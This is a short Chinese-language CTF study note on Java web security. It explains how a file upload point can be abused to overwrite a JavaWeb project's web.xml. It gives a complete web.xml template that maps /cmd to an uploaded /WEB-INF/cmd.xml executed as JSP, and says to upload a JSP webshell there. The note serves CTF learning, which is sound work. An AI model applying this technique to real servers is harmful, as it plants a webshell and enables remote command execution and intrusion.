---
title: Java 的杂项
categories:
- Network_Security
- Web
- Java_Security
- Misc
tags:
- Network_Security
- Java
---

# Java 的杂项

1. 收录一些不知道怎么分类的，和 Java 相关的安全题，更多偏 CTF 吧。

## 1. JavaWeb 项目修改 web.xml

1. 一般是项目有文件上传点时，如果它是一个 JavaWeb 项目，那么考虑修改其 web.xml（可以类比为修改 .htaccess），RCE 思路就是文件上传的思路。

2. 补充一下 JavaWeb 的项目结构，首先是项目名文件夹，其中包含：

    1. css、html、images、js 四个静态文件夹
    2. META-INF、WEB-INF 两个文件夹。其中 web.xml 就在 WEB-INF 中。

3. 这里给一个 web.xml 模板：
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
             xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
             http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
             version="4.0">
    
        <welcome-file-list>
            <welcome-file>index.html</welcome-file>
        </welcome-file-list>
      
        <servlet-mapping>
            <servlet-name>default</servlet-name>
            <url-pattern>*.js</url-pattern>
            <url-pattern>*.css</url-pattern>
            <url-pattern>/css/*"</url-pattern>
            <url-pattern>/scss/*"</url-pattern>
            <url-pattern>/font/*"</url-pattern>
            <url-pattern>/images/*</url-pattern>
            <url-pattern>/js/*</url-pattern>
            <url-pattern>/lay/*</url-pattern>
            <url-pattern>/static/*</url-pattern>
        </servlet-mapping>
    
        <servlet>
            <servlet-name>cmd</servlet-name>
            <!-- 将指定的文件解析为 jsp 文件 -->
            <!-- WEB-INF 前必须有 / ，表示从根目录开始 -->
            <jsp-file>/WEB-INF/cmd.xml</jsp-file>
        </servlet>
    
        <servlet-mapping>
            <servlet-name>cmd</servlet-name>
            <!-- 配置访问路径 -->
            <url-pattern>/cmd</url-pattern>
        </servlet-mapping>
    
    </web-app>
    ```

    然后在 WEB-INF 下上传 `cmd.xml`，里面是 jsp 马就行。

4. 例题：\[2024源鲁杯\]\[Round 1\] TOXEC。
